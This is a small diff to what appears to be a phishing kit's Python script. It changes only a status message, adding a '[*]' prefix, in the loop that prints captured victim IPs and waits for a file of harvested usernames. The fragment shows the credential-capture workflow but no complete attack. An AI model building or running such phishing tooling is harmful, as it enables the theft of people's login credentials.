@@ -119,7 +119,7 @@ while(i != 1):
         os.system("cat sites/%s/ip.txt" % server)
         os.system("rm sites/%s/ip.txt" % server)
         i = i+1
-print("\nWaiting for credentials\n")        
+print("\n[*]Waiting for credentials\n")        
 while True:
     if os.path.exists("sites/%s/usernames.txt" % server):
         username =("cat sites/%s/usernames.txt" % server)
